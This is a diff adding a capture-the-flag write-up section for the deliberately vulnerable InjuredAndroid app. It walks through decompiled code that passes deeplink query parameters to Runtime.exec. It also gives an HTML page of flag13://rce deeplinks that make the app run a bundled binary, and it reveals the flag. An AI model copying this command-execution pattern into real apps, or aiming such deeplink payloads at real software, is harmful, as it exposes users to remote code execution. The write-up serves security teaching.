@@ -580,3 +580,138 @@ Now the content of the extra-string if it is not a `https` link, it will jut tre
 And the flag screen will come before you.
 
 ![Flag image for chal 12](./Images/protected.png)
+
+## Challenge 13
+
+This challenge was a bit tricky but not that hard. When we open the challenge tab we just see an screen. Coming to jadx, we check the `manifest` file. 
+
+```xml
+<activity
+            android:theme="@style/AppTheme.NoActionBar"
+            android:label="@string/title_activity_rce"
+            android:name="b3nac.injuredandroid.RCEActivity">
+            <intent-filter android:label="filter_view_flag11">
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data
+                    android:scheme="flag13"
+                    android:host="rce"/>
+            </intent-filter>
+        </activity>
+```
+
+From this xml we can see that we can sent intent has a scheme : `flag13` and a hostname : `rce`. Next we go check the `RCEActivity`. 
+
+```java
+protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        setContentView(R.layout.activity_rce);
+        j.j.a(this);
+        C((Toolbar) findViewById(R.id.toolbar));
+        G();
+        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new a());
+        if (getIntent() != null) {
+            Intent intent = getIntent();
+            d.s.d.g.d(intent, "intent");
+            if (intent.getData() != null) {
+                H();
+                Intent intent2 = getIntent();
+                d.s.d.g.d(intent2, "intent");
+                Uri data = intent2.getData();
+                try {
+                    d.s.d.g.c(data);
+                    String queryParameter = data.getQueryParameter("binary");
+                    String queryParameter2 = data.getQueryParameter("param");
+                    String queryParameter3 = data.getQueryParameter("combined");
+                    if (queryParameter3 != null) {
+                        this.x.b(new b(queryParameter3));
+                    } else {
+                        Runtime runtime = Runtime.getRuntime();
+                        StringBuilder sb = new StringBuilder();
+                        File filesDir = getFilesDir();
+                        d.s.d.g.d(filesDir, "filesDir");
+                        sb.append(filesDir.getParent());
+                        sb.append("/files/");
+                        sb.append(queryParameter);
+                        sb.append(" ");
+                        sb.append(queryParameter2);
+                        Process exec = runtime.exec(sb.toString());
+                        d.s.d.g.d(exec, "process");
+                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()));
+                        StringBuilder sb2 = new StringBuilder();
+                        d.r.c.a(bufferedReader, new c(sb2));
+                        exec.waitFor();
+                        TextView textView = (TextView) findViewById(R.id.RCEView);
+                        d.s.d.g.d(textView, "tv");
+                        textView.setText(sb2.toString());
+                    }
+                } catch (IOException e) {
+                    Log.e("RCEActivity", "OH NO AN ERROR OCCURED!!!:" + e.getMessage());
+                }
+            }
+        }
+    }
+```
+
+Upon reading this code we understand that we can pass parameters through our deeplinks:- `binary`, `param`, `combined`. 
+
+There is an interesting function in this activity. It is `H()`. 
+```java
+try {
+            strArr = assets.list("");
+        } catch (IOException e) {
+            Log.e("tag", "Failed to get asset file list.", e);
+            strArr = null;
+        }
+        if (strArr != null) {
+            for (String str : strArr) {
+                if ((!d.s.d.g.a(str, "webkit")) && (!d.s.d.g.a(str, "images")) && (!d.s.d.g.a(str, "flutter_assets")) && (!d.s.d.g.a(str, "locales"))) {
+                    try {
+                        inputStream = assets.open(str);
+                        try {
+                            StringBuilder sb2 = new StringBuilder();
+                            File filesDir = getFilesDir();
+                            d.s.d.g.d(filesDir, "filesDir");
+                            sb2.append(filesDir.getParent());
+                            sb2.append("/files/");
+                            fileOutputStream = new FileOutputStream(new File(sb2.toString(), str));
+```
+
+Analyzing it we understand that it is copying some files which satisfies the condition in the `if`. In the `onCreate` activity also we see that the `binary` parameter with `param` is executed by the app. And if `combined` is passed as query, the value is checked with the server value. Now what might be the server value? Well lets not worry about that. First lets check the `binary` to figure out what input is it expecting. By the way `narnia.x84_64` is the binary which is the challenge binary, plus I am on x84_64 architecture so yeah.
+
+We get the binary using `apktool` and then analyze it using any `decompiler`. I used IDA Pro.
+
+In `main.main` we see this:-
+![Ida decompilation of the binary](./Images/chal13_decomp.png)
+
+We can clearly see that we can type `--help`. Lets do that and the output is:- 
+
+```
+./narnia.x86_64 --help
+Available commands are testOne, rick, testTwo, potato, testThree
+```
+
+Well then we just use the inputs and see the outputs. Only `testOne`, `testTwo`, and `testThree` are the inputs we need the outputs we get are `Treasure`, `_`, and `Planet` respectively.
+
+We will act according to the `hint` and concat it to get `Treasure_Planet`.
+### The exploit
+
+We will write a `html` code to send the `intent` to the app on the device.
+
+```html
+<html>
+<p><a href="flag13://rce?binary=narnia.x86_64&param=testOne">Test one!</p>
+<p><a href="flag13://rce?binary=narnia.x86_64&param=testTwo">Test two!</p>
+<p><a href="flag13://rce?binary=narnia.x86_64&param=testThree">Test three!</p>
+<p><a href="flag13://rce?combined=Treasure_Planet">aaaa</p>
+</html>
+```
+
+We will push this file to our device using the command
+
+`adb push .\lvl_13.html /sdcard/Download`
+
+Now just run the `html` on the device and click on the links one by one. We can directly click the last one as we already have the flag but it is a proof of concept that we can make the app execute a binary.
+
+Flag :- `Treasure_Planet`
